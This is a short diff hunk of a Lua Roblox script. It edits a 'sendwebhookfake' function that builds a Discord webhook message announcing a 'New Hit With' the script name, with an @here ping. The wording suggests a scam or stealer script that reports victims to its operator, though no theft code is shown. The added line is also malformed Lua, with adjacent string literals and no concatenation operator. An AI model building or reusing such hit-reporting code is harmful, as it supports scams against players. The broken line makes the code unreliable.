@@ -43,7 +43,7 @@ _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame
 local function sendwebhookfake(msgfake)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
-	["content"]= "**🎁New Hit With **".._G.ScriptName.. " || @here|| ",
+	["content"]= "**🎁New Hit With **""**".._G.ScriptName.. "**"" || @here|| ",
 	["username"] = "Arkhalis",
 	["embeds"]= {
 	  {
